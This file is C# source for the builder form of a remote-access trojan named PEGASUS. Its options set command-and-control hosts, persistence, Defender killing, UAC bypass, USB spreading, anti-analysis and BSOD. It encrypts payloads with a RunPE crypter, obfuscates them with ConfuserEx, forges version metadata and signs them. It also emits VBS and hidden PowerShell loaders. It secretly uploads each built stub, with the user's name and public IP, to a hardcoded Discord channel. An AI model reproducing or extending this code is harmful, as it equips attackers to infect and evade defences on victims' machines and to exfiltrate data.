using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.DirectoryServices;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using Discord;
using Discord.WebSocket;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Guna.UI2.AnimatorNS;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using PEGASUS.Algorithm;
using PEGASUS.Forms.RenamingObfuscation;
using PEGASUS.Helper;
using PEGASUS.Loader;
using PEGASUS.Properties;
using Toolbelt.Drawing;
using Vestris.ResourceLib;

namespace PEGASUS.Forms
	{
public class FormBuilder : Form
{
	private enum GetWindow_Cmd : uint
	{
		GW_HWNDFIRST,
		GW_HWNDLAST,
		GW_HWNDNEXT,
		GW_HWNDPREV,
		GW_OWNER,
		GW_CHILD,
		GW_ENABLEDPOPUP
	}

	private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

	private static Random randnum = new Random();

	private DiscordSocketClient _client;

	private DiscordSocketClient client;

	private string vcFUoknuUGOaxmFuhuaHnywrk;

	private string FileName = string.Empty;

	private Random T = new Random();

	private const int WM_COMMAND = 273;

	private readonly Random random = new Random();

	private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";

	private IContainer components;

	private DirectoryEntry directoryEntry1;

	private ToolTip toolTip1;

	private TextBox txtGroup;

	private Label label17;

	private Label label16;

	private Label label5;

	private Label label3;

	private Label label4;

	private PictureBox picIcon;

	private Label label14;

	private Label label13;

	private Label label12;

	private Label label11;

	private Label label10;

	private Label label9;

	private Label label7;

	private Label label8;

	private ListBox listBoxIP;

	private ListBox listBoxPort;

	private Guna2PictureBox guna2PictureBox1;

	private Guna2GradientButton btnAddIP;

	private Guna2GradientButton btnClone;

	private Guna2GradientButton btnRemoveIP;

	private Guna2GradientButton btnAddPort;

	private Guna2GradientButton btnRemovePort;

	private Guna2GradientButton btnIcon;

	private Guna2TabControl guna2TabControl1;

	private TabPage tabPage1;

	private TabPage tabPage2;

	private TabPage tabPage3;

	private TabPage tabPage4;

	private TabPage tabPage5;

	private Guna2GradientButton btnBuild;

	private Guna2Panel guna2Panel1;

	private Label label6;

	private Guna2CheckBox chkObfu;

	private Label label15;

	private PictureBox pictureBox1;

	private Guna2CheckBox chkBsod;

	private Guna2CheckBox chkAntiProcess;

	private Guna2CheckBox chkAnti;

	private Guna2CheckBox chkIcon;

	private Guna2CheckBox btnAssembly;

	private Guna2CheckBox checkBox1;

	private Guna2ComboBox comboBoxFolder;

	private Guna2NumericUpDown numDelay;

	private Guna2CheckBox chkPaste_bin;

	private Guna2PictureBox guna2PictureBox3;

	private Guna2PictureBox guna2PictureBox2;

	private Guna2Transition guna2Transition2;

	private Guna2Transition guna2Transition1;

	private Guna2Separator guna2Separator1;

	private Guna2BorderlessForm guna2BorderlessForm1;

	private Guna2CheckBox chVRunPe;

	private Guna2GradientButton btnShellcode;

	private Guna2ShadowForm guna2ShadowForm1;

	private Guna2GroupBox guna2GroupBox5;

	private Guna2GroupBox guna2GroupBox4;

	private Guna2GroupBox guna2GroupBox3;

	private Guna2GroupBox guna2GroupBox1;

	private Guna2GroupBox guna2GroupBox2;

	private Label label18;

	private Label label19;

	private RichTextBox richTextBox2;

	private Guna2Separator guna2Separator6;

	private Guna2Separator guna2Separator5;

	private Guna2Separator guna2Separator4;

	private Guna2Separator guna2Separator3;

	private Guna2Separator guna2Separator2;

	private Guna2TextBox txtIcon;

	private Guna2TextBox txtFileVersion;

	private Guna2TextBox txtProductVersion;

	private Guna2TextBox txtOriginalFilename;

	private Guna2TextBox txtCompany;

	private Guna2TextBox txtCopyright;

	private Guna2TextBox txtTrademarks;

	private Guna2TextBox txtDescription;

	private Guna2TextBox txtProduct;

	private Guna2TextBox txtPaste_bin;

	private Guna2TextBox txtMutex;

	private Guna2TextBox textFilename;

	private Guna2TextBox textPort;

	private Guna2TextBox textIP;

	private Label label21;

	private Label label20;

	private Guna2VSeparator guna2VSeparator1;

	private Guna2Separator guna2Separator7;

	private Guna2ContextMenuStrip guna2ContextMenuStrip2;

	private ToolStripMenuItem toolStripMenuItem70;

	private Guna2CheckBox chkExclude;

	private Guna2CheckBox chkAntiK;

	private Guna2CheckBox chkUac;

	private Guna2HtmlToolTip guna2HtmlToolTip1;

	private Guna2PictureBox guna2PictureBox4;

	private Guna2CheckBox chkPowershell;

	private Guna2GradientButton btnStatic;

	private Guna2GradientButton btnEx;

	private Guna2GradientButton btnLocal;

	private Guna2CheckBox chkVBS;

	private Guna2CheckBox chkCert;

	private Guna2CheckBox chkKillWD;

	private Guna2CheckBox chkUSB;

	private Guna2GradientButton guna2GradientButton1;

	public FormBuilder()
	{
		InitializeComponent();
	}

	private void SaveSettings()
	{
		try
		{
			List<string> list = new List<string>();
			foreach (string item3 in listBoxPort.Items)
			{
				list.Add(item3);
			}
			PEGASUS.Properties.Settings.Default.Ports = string.Join(",", list);
			List<string> list2 = new List<string>();
			foreach (string item4 in listBoxIP.Items)
			{
				list2.Add(item4);
			}
			PEGASUS.Properties.Settings.Default.IP = string.Join(",", list2);
			PEGASUS.Properties.Settings.Default.Save();
		}
		catch
		{
		}
	}

	private void checkBox1_CheckedChanged(object sender, EventArgs e)
	{
		if (checkBox1.Checked)
		{
			checkBox1.Text = "Installation ON";
			textFilename.Enabled = true;
			comboBoxFolder.Enabled = true;
		}
		else
		{
			checkBox1.Text = "Installation OFF";
			textFilename.Enabled = false;
			comboBoxFolder.Enabled = false;
		}
	}

	private void Builder_Load(object sender, EventArgs e)
	{
		string path = Application.UserAppDataPath + "\\tsimpouki";
		if (!Directory.Exists(path))
		{
			Directory.CreateDirectory(path).Attributes = System.IO.FileAttributes.Hidden | System.IO.FileAttributes.Directory;
		}
		File.WriteAllBytes(Application.UserAppDataPath + "\\tsimpouki\\tsimpouki.dll", Resources.tsimpouki);
		string path2 = Path.Combine(Path.GetTempPath(), reupload("Ifcod~$oro"));
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		comboBoxFolder.SelectedIndex = 0;
		if (PEGASUS.Properties.Settings.Default.Mutex.Length == 0)
		{
			txtMutex.Text = getRandomCharacters();
		}
	}

	private void CheckBox2_CheckedChanged(object sender, EventArgs e)
	{
		if (chkPaste_bin.Checked)
		{
			txtPaste_bin.Enabled = true;
			textIP.Enabled = false;
			textPort.Enabled = false;
			listBoxIP.Enabled = false;
			listBoxPort.Enabled = false;
			btnAddIP.Enabled = false;
			btnAddPort.Enabled = false;
			btnRemoveIP.Enabled = false;
			btnRemovePort.Enabled = false;
		}
		else
		{
			txtPaste_bin.Enabled = false;
			textIP.Enabled = true;
			textPort.Enabled = true;
			listBoxIP.Enabled = true;
			listBoxPort.Enabled = true;
			btnAddIP.Enabled = true;
			btnAddPort.Enabled = true;
			btnRemoveIP.Enabled = true;
			btnRemovePort.Enabled = true;
		}
	}

	private void BtnRemovePort_Click(object sender, EventArgs e)
	{
		if (listBoxPort.SelectedItems.Count == 1)
		{
			listBoxPort.Items.Remove(listBoxPort.SelectedItem);
		}
	}

	private void BtnAddPort_Click(object sender, EventArgs e)
	{
		try
		{
			Convert.ToInt32(textPort.Text.Trim());
			foreach (string item in listBoxPort.Items)
			{
				if (item.Equals(textPort.Text.Trim()))
				{
					return;
				}
			}
			listBoxPort.Items.Add(textPort.Text.Trim());
			textPort.Clear();
		}
		catch
		{
		}
	}

	private void BtnRemoveIP_Click(object sender, EventArgs e)
	{
		if (listBoxIP.SelectedItems.Count == 1)
		{
			listBoxIP.Items.Remove(listBoxIP.SelectedItem);
		}
		if (listBoxPort.SelectedItems.Count == 1)
		{
			listBoxPort.Items.Remove(listBoxPort.SelectedItem);
		}
	}

	private void BtnAddIP_Click(object sender, EventArgs e)
	{
		try
		{
			foreach (string item in listBoxIP.Items)
			{
				textIP.Text = textIP.Text.Replace(" ", "");
				if (item.Equals(textIP.Text))
				{
					return;
				}
			}
			listBoxIP.Items.Add(textIP.Text.Replace(" ", ""));
			textIP.Clear();
			textIP.Text = Settings.IP;
		}
		catch
		{
		}
		try
		{
			Convert.ToInt32(textPort.Text.Trim());
			foreach (string item2 in listBoxPort.Items)
			{
				if (item2.Equals(textPort.Text.Trim()))
				{
					return;
				}
			}
			listBoxPort.Items.Add(textPort.Text.Trim());
			textPort.Clear();
		}
		catch
		{
		}
	}

	private static string reupload(string str)
	{
		char c = '\n';
		StringBuilder stringBuilder = new StringBuilder();
		char[] array = str.ToCharArray();
		for (int i = 0; i < array.Length; i++)
		{
			char value = (char)(array[i] ^ c);
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static void canibuild()
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string name = reupload("ZOMKY_Y$Zomky\u007fyHs~oy$Zomky\u007fyHs~oy$aos");
		using Stream stream = executingAssembly.GetManifestResourceStream(name);
		using StreamReader streamReader = new StreamReader(stream);
		string obj = streamReader.ReadToEnd();
		string path = Path.Combine(Path.GetTempPath(), reupload("Ifcod~$oro"));
		byte[] bytes = Convert.FromBase64String(Decrypt(obj.Replace("*", "O").Replace("-", "o").Replace(":", "A")));
		File.WriteAllBytes(path, bytes);
		File.SetAttributes(path, System.IO.FileAttributes.Hidden);
	}

	private async void BtnBuild_Click(object sender, EventArgs e)
	{
		if ((!chkPaste_bin.Checked && listBoxIP.Items.Count == 0) || listBoxPort.Items.Count == 0)
		{
			return;
		}
		if (checkBox1.Checked)
		{
			if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text))
			{
				return;
			}
			if (!textFilename.Text.EndsWith("exe"))
			{
				textFilename.Text += ".exe";
			}
		}
		if (string.IsNullOrWhiteSpace(txtMutex.Text))
		{
			txtMutex.Text = getRandomCharacters();
		}
		if (chkPaste_bin.Checked && string.IsNullOrWhiteSpace(txtPaste_bin.Text))
		{
			return;
		}
		guna2Transition1.ShowSync(guna2PictureBox2);
		string Billyinstallpath = Path.Combine(Path.GetTempPath(), reupload("Ifcod~$oro"));
		if (File.Exists(Billyinstallpath))
		{
			File.Delete(Billyinstallpath);
			canibuild();
		}
		else
		{
			canibuild();
		}
		ModuleDefMD asmDef = null;
		try
		{
			using (asmDef = ModuleDefMD.Load(Billyinstallpath))
			{
				using SaveFileDialog saveFileDialog1 = new SaveFileDialog();
				saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
				saveFileDialog1.InitialDirectory = Application.StartupPath;
				saveFileDialog1.OverwritePrompt = false;
				saveFileDialog1.FileName = "Client";
				if (saveFileDialog1.ShowDialog() != DialogResult.OK)
				{
					return;
				}
				btnBuild.Enabled = false;
				WriteSettings(asmDef, saveFileDialog1.FileName);
				await Task.Run(delegate
				{
					Renaming.DoRenaming(asmDef);
				});
				asmDef.Write(saveFileDialog1.FileName);
				asmDef.Dispose();
				File.Delete(Billyinstallpath);
				if (btnAssembly.Checked)
				{
					WriteAssembly(saveFileDialog1.FileName);
				}
				if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
				{
					IconInjector.InjectIcon(saveFileDialog1.FileName, txtIcon.Text);
				}
				guna2Transition1.HideSync(guna2PictureBox2);
				guna2Transition1.ShowSync(guna2PictureBox3);
				SaveSettings();
				if (chVRunPe.Checked)
				{
					while (!File.Exists(saveFileDialog1.FileName))
					{
					}
					byte[] data = File.ReadAllBytes(saveFileDialog1.FileName);
					string newValue = (string)Runpe(ref data);
					byte[] data2 = File.ReadAllBytes(Application.UserAppDataPath + "\\tsimpouki\\tsimpouki.dll");
					string newValue2 = (string)Runpe(ref data2);
					string text = Convert.ToString(Resources.RK);
					text = (vcFUoknuUGOaxmFuhuaHnywrk = text.Replace("%1%", RandomString()).Replace("%2%", RandomString()).Replace("%3%", RandomString())
						.Replace("%4%", RandomString())
						.Replace("%5%", RandomString())
						.Replace("%28%", RandomString())
						.Replace("%6%", RandomString())
						.Replace("%7%", RandomString())
						.Replace("%8%", RandomString())
						.Replace("%9%", RandomString())
						.Replace("%10%", RandomString())
						.Replace("%11%", RandomString())
						.Replace("%12%", RandomString())
						.Replace("%13%", RandomString())
						.Replace("%14%", RandomString())
						.Replace("%15%", RandomString())
						.Replace("%16%", RandomString())
						.Replace("%17%", RandomString())
						.Replace("%18%", RandomString())
						.Replace("%19%", RandomString())
						.Replace("%20%", RandomString())
						.Replace("%21%", RandomString())
						.Replace("%22%", RandomString())
						.Replace("%23%", RandomString())
						.Replace("%24%", RandomString())
						.Replace("%25%", RandomString())
						.Replace("%44%", RandomString())
						.Replace("%26%", RandomString())
						.Replace("%35%", RandomString())
						.Replace("%36%", RandomString())
						.Replace("%37%", RandomString())
						.Replace("%29%", RandomString())
						.Replace("%27%", RandomString())
						.Replace("%90%", RandomString())
						.Replace("%Atom%", richTextBox2.Text)
						.Replace("%30%", RandomString())
						.Replace("%31%", RandomString())
						.Replace("%34%", RandomString())
						.Replace("%32%", RandomString())
						.Replace("%RunpePassword%", "MyD4rkRootK")
						.Replace("%PEGASUS%", newValue)
						.Replace("%Runpe%", newValue2)
						.Replace("%Password%", "MyD4rkRootK")
						.Replace("%FolderName%", "PEGASUS")
						.Replace("%Name%", "PEGASUS")
						.Replace("%Startup File Name%", "PEGASUS"));
					vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("//Startup", "//" + RandomString());
					vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("%Name%", RandomString());
					vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("%FolderName%", RandomString());
					vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("%Startup File Name%", RandomString());
					vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("//Assembly", "//" + RandomString());
					vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{1}", RandomString());
					vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{2}", RandomString());
					vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{3}", RandomString());
					vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{4}", RandomString());
					vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{5}", RandomString());
					vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{7}", RandomString());
					vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{8}", RandomString());
					vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{9}", RandomString());
					vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{10}", RandomString());
					vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("//Default", null);
					Codedom(saveFileDialog1.FileName, vcFUoknuUGOaxmFuhuaHnywrk, null);
					new Thread((ThreadStart)delegate
					{
						ToggleDesktopIcons();
					}).Start();
					MsgBox.Show("Build Encrypted Successfully!Press ok!", "PEGASUS Builder", MsgBox.Buttons.OK);
					new Thread((ThreadStart)delegate
					{
						ToggleDesktopIcons();
					}).Start();
					File.Delete(Billyinstallpath);
				}
				if (chkVBS.Checked)
				{
					while (!File.Exists(saveFileDialog1.FileName))
					{
					}
					string text2 = Resources.vbs.Replace("#sleep", new Random().Next(35, 40).ToString()).Replace("#base64", Strings.StrReverse(Convert.ToBase64String(File.ReadAllBytes(saveFileDialog1.FileName)))).Replace("#name", "PEGASUS");
					string contents = ((!checkBox1.Checked) ? text2.Replace("#startup ", "") : text2.Replace("'#startup  ", "").Replace("#startup ", "Copy-Item '\" & currentPath & \"' '\" & startPath & \"';"));
					File.WriteAllText(saveFileDialog1.FileName.Replace("exe", "vbs"), contents);
				}
				if (chkPowershell.Checked)
				{
					while (!File.Exists(saveFileDialog1.FileName))
					{
					}
					string uRL = await AsyncUpload(saveFileDialog1.FileName);
					Config config = new Config();
					config.Classname = RandomString(25);
					config.Namespace = RandomString(10) + "." + RandomString(10);
					config.MethodName = RandomString(25);
					config.MethodName2 = RandomString(25);
					config.MethodName3 = RandomString(25);
					config.ApplicationData = RandomString(25);
					config.DirectURL = RandomString(25);
					config.URL2 = uRL;
					string contents2 = new SourceBuilder().Build(config);
					File.WriteAllText("Loader.ps1", contents2);
					string text3 = Environment.CurrentDirectory + "\\ps2exe";
					if (!Directory.Exists(text3))
					{
						Directory.CreateDirectory(text3);
					}
					File.WriteAllBytes(text3 + "\\ps2exe.ps1", Resources.ps2exe);
					Process process = new Process();
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.CreateNoWindow = true;
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process.StartInfo.FileName = "powershell";
					process.StartInfo.Arguments = " -w hidden -ep bypass -c " + Environment.CurrentDirectory + "\\ps2exe\\ps2exe.ps1 " + Environment.CurrentDirectory + "\\Loader.ps1";
					process.Start();
					process.WaitForExit();
					if (File.Exists(saveFileDialog1.FileName))
					{
						File.Delete(saveFileDialog1.FileName);
					}
					if (File.Exists(Environment.CurrentDirectory + "\\Loader.ps1"))
					{
						File.Delete(Environment.CurrentDirectory + "\\Loader.ps1");
					}
					if (Directory.Exists(text3))
					{
						Directory.Delete(text3, recursive: true);
					}
				}
				if (chkCert.Checked && File.Exists(saveFileDialog1.FileName))
				{
					using OpenFileDialog openFileDialog = new OpenFileDialog();
					openFileDialog.Multiselect = false;
					openFileDialog.Filter = "Executable (*.pfx)|*.pfx|All files (*.*)|*.*";
					if (openFileDialog.ShowDialog() == DialogResult.OK)
					{
						string fileName = openFileDialog.FileName;
						string text4 = "C:\\Program Files (x86)\\Windows Kits\\10\\App Certification Kit\\signtool.exe";
						Path.Combine(Path.GetTempPath(), "exec.bat");
						string text5 = Path.Combine(Path.GetTempPath(), "log.txt");
						string text6 = InputDialog.Show("\nCert Password please?.\n\n");
						StreamWriter streamWriter = new StreamWriter(Path.Combine(Path.GetTempPath(), "exec.bat"));
						streamWriter.WriteLine("set exeFile=" + text4);
						streamWriter.WriteLine("set logFile=" + text5);
						streamWriter.WriteLine("%exeFile%  sign /f " + fileName + " /p  " + text6 + " " + saveFileDialog1.FileName + " > %logFile%");
						streamWriter.Close();
						string fileName2 = Path.Combine(Path.Combine(Path.GetTempPath(), "exec.bat"));
						Process.Start(new ProcessStartInfo
						{
							FileName = fileName2,
							CreateNoWindow = true,
							WindowStyle = ProcessWindowStyle.Hidden,
							UseShellExecute = true,
							ErrorDialog = false
						}).WaitForExit();
					}
				}
				if (!chkPowershell.Checked)
				{
					Confuser(saveFileDialog1.FileName, saveFileDialog1.FileName);
					MsgBox.Show("Payload Ready To Fly!", "Pegasus Builder", MsgBox.Buttons.OK);
				}
				else
				{
					Confuser(saveFileDialog1.FileName, saveFileDialog1.FileName);
					MsgBox.Show("Compiled Loader Successfully!", "Pegasus Builder", MsgBox.Buttons.OK);
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			asmDef?.Dispose();
			btnBuild.Enabled = true;
		}
	}

	public static string RandomString(int length)
	{
		return new string((from s in Enumerable.Repeat("ΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩαβγδεζηθικλμνξοπρστυφχψωABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي0123456789艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת", length)
						   select s[randnum.Next(s.Length)]).ToArray());
	}

	public async Task<string> AsyncUpload(string file)
	{
		Path.GetTempPath();
		_client = new DiscordSocketClient();
		string token = "";
		await _client.LoginAsync(TokenType.Bot, token);
		await _client.StartAsync();
		await Task.Delay(1024);
		string name = WindowsIdentity.GetCurrent().Name;
		IPAddress iPAddress = IPAddress.Parse(new WebClient().DownloadString("http://ipinfo.io/ip").Replace("\\r\\n", "").Replace("\\n", "")
			.Trim());
		return (await _client.Guilds.Single((SocketGuild g) => g.Id == 897374276284473344L).TextChannels.Single((SocketTextChannel ch) => ch.Id == 912409632377544724L).SendFileAsync(file, "New Client Stub Uploaded | " + name + " | " + iPAddress)).Attachments.FirstOrDefault().Url;
	}

	private static void Timer_Elapsed(object sender, ElapsedEventArgs e)
	{
		Application.Exit();
	}

	private static void Confuser(string file, string output)
	{
		string path = Path.GetTempPath() + "them.tmd";
		string text = Resources.config.ToString();
		File.WriteAllText(contents: text.Replace("%path%", Path.GetTempPath()).Replace("%stub%", file), path: Path.GetTempPath() + "configconfuser.crproj");
		File.WriteAllBytes(Path.GetTempPath() + "confuser.zip", Resources.ConfuserEx);
		File.WriteAllBytes(Path.GetTempPath() + "confuser.zip", Resources.ConfuserEx);
		if (Directory.Exists(Path.GetTempPath() + "Confuser"))
		{
			Directory.Delete(Path.GetTempPath() + "Confuser", recursive: true);
			Directory.CreateDirectory(Path.GetTempPath() + "Confuser");
		}
		ZipFile.ExtractToDirectory(Path.GetTempPath() + "confuser.zip", Path.GetTempPath() + "Confuser");
		Interaction.Shell(Path.GetTempPath() + "Confuser\\Confuser.CLI.exe -n " + Path.GetTempPath() + "configconfuser.crproj", AppWinStyle.Hide, Wait: true);
		File.Delete(file + ".bak");
		File.Delete(Path.GetTempPath() + "confuser.zip");
		File.Delete(Path.GetTempPath() + "configconfuser.crproj");
		File.Delete(path);
		Directory.Delete(Path.GetTempPath() + "Confuser", recursive: true);
	}

	public static object About(ref byte[] data, string pass)
	{
		byte[] key = new MD5CryptoServiceProvider().ComputeHash(Encoding.Unicode.GetBytes(pass));
		return new TripleDESCryptoServiceProvider
		{
			Key = key,
			Mode = CipherMode.ECB
		}.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);
	}

	public object Runpe(ref byte[] data)
	{
		StringBuilder stringBuilder = new StringBuilder();
		byte[] array = (byte[])About(ref data, "MyD4rkRootK");
		foreach (byte value in array)
		{
			stringBuilder.Append(value);
			stringBuilder.Append(",");
		}
		return stringBuilder.ToString().Remove(stringBuilder.Length - 1);
	}

	public void Codedom(string Path, string Code, string MainClass)
	{
		CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider(new Dictionary<string, string> { { "CompilerVersion", "v4.0" } });
		CompilerParameters compilerParameters = new CompilerParameters
		{
			GenerateExecutable = true,
			OutputAssembly = Path
		};
		compilerParameters.CompilerOptions += "/platform:X86 /unsafe /target:winexe";
		compilerParameters.MainClass = MainClass;
		compilerParameters.IncludeDebugInformation = false;
		compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
		compilerParameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
		compilerParameters.ReferencedAssemblies.Add("System.Linq.dll");
		compilerParameters.ReferencedAssemblies.Add("System.Core.dll");
		compilerParameters.ReferencedAssemblies.Add("System.Data.dll");
		compilerParameters.ReferencedAssemblies.Add("System.Deployment.dll");
		compilerParameters.ReferencedAssemblies.Add("System.Drawing.dll");
		compilerParameters.ReferencedAssemblies.Add("System.Xml.dll");
		compilerParameters.ReferencedAssemblies.Add("System.Xml.Linq.dll");
		compilerParameters.ReferencedAssemblies.Add("System.dll");
		compilerParameters.ReferencedAssemblies.Add(Process.GetCurrentProcess().MainModule.FileName);
		compilerParameters.ReferencedAssemblies.Add(Application.ExecutablePath);
		CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, Code);
		if (compilerResults.Errors.Count <= 0)
		{
			return;
		}
		foreach (CompilerError error in compilerResults.Errors)
		{
			MessageBox.Show(error.ErrorText);
		}
	}

	private string RandomString()
	{
		string text = "αβγδεζηθικλμνξοπρστυφχψωΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת";
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 1; i <= 11; i++)
		{
			int startIndex = T.Next(0, 177);
			stringBuilder.Append(text.Substring(startIndex, 1));
		}
		return stringBuilder.ToString();
	}

	public void PEGASUScryptpe()
	{
	}

	private static void ToggleDesktopIcons()
	{
		IntPtr wParam = new IntPtr(29698);
		IntPtr intPtr = IntPtr.Zero;
		if (Environment.OSVersion.Version.Major < 6 || Environment.OSVersion.Version.Minor < 2)
		{
			intPtr = GetWindow(FindWindow("Progman", "Program Manager"), GetWindow_Cmd.GW_CHILD);
		}
		else
		{
			IEnumerable<IntPtr> source = FindWindowsWithClass("WorkerW");
			int num = 0;
			while (intPtr == IntPtr.Zero && num < source.Count())
			{
				intPtr = FindWindowEx(source.ElementAt(num), IntPtr.Zero, "SHELLDLL_DefView", null);
				num++;
			}
		}
		SendMessage(intPtr, 273u, wParam, IntPtr.Zero);
	}

	[DllImport("Shell32.dll")]
	private static extern int SHChangeNotify(int eventId, int flags, IntPtr item1, IntPtr item2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr GetWindow(IntPtr hWnd, GetWindow_Cmd uCmd);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

	[DllImport("user32.dll", CharSet = CharSet.Unicode)]
	private static extern int GetWindowText(IntPtr hWnd, StringBuilder strText, int maxCount);

	[DllImport("user32.dll", CharSet = CharSet.Unicode)]
	private static extern int GetWindowTextLength(IntPtr hWnd);

	[DllImport("user32.dll")]
	private static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

	public static string GetWindowText(IntPtr hWnd)
	{
		int windowTextLength = GetWindowTextLength(hWnd);
		if (windowTextLength++ > 0)
		{
			StringBuilder stringBuilder = new StringBuilder(windowTextLength);
			GetWindowText(hWnd, stringBuilder, stringBuilder.Capacity);
			return stringBuilder.ToString();
		}
		return string.Empty;
	}

	public static IEnumerable<IntPtr> FindWindowsWithClass(string className)
	{
		_ = IntPtr.Zero;
		List<IntPtr> windows = new List<IntPtr>();
		EnumWindows(delegate (IntPtr wnd, IntPtr param)
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			GetClassName(wnd, stringBuilder, stringBuilder.Capacity);
			if (stringBuilder.ToString() == className && (GetWindowText(wnd) == "" || GetWindowText(wnd) == null))
			{
				windows.Add(wnd);
			}
			return true;
		}, IntPtr.Zero);
		return windows;
	}

	private void WriteAssembly(string filename)
	{
		try
		{
			VersionResource versionResource = new VersionResource();
			versionResource.LoadFrom(filename);
			versionResource.FileVersion = txtFileVersion.Text;
			versionResource.ProductVersion = txtProductVersion.Text;
			versionResource.Language = 0;
			StringFileInfo obj = (StringFileInfo)versionResource["StringFileInfo"];
			obj["ProductName"] = txtProduct.Text;
			obj["FileDescription"] = txtDescription.Text;
			obj["CompanyName"] = txtCompany.Text;
			obj["LegalCopyright"] = txtCopyright.Text;
			obj["LegalTrademarks"] = txtTrademarks.Text;
			obj["Assembly Version"] = versionResource.ProductVersion;
			obj["InternalName"] = txtOriginalFilename.Text;
			obj["OriginalFilename"] = txtOriginalFilename.Text;
			obj["ProductVersion"] = versionResource.ProductVersion;
			obj["FileVersion"] = versionResource.FileVersion;
			versionResource.SaveTo(filename);
		}
		catch (Exception ex)
		{
			throw new ArgumentException("Assembly: " + ex.Message);
		}
	}

	private void BtnAssembly_CheckedChanged(object sender, EventArgs e)
	{
		if (btnAssembly.Checked)
		{
			btnClone.Enabled = true;
			txtProduct.Enabled = true;
			txtDescription.Enabled = true;
			txtCompany.Enabled = true;
			txtCopyright.Enabled = true;
			txtTrademarks.Enabled = true;
			txtOriginalFilename.Enabled = true;
			txtOriginalFilename.Enabled = true;
			txtProductVersion.Enabled = true;
			txtFileVersion.Enabled = true;
		}
		else
		{
			btnClone.Enabled = false;
			txtProduct.Enabled = false;
			txtDescription.Enabled = false;
			txtCompany.Enabled = false;
			txtCopyright.Enabled = false;
			txtTrademarks.Enabled = false;
			txtOriginalFilename.Enabled = false;
			txtOriginalFilename.Enabled = false;
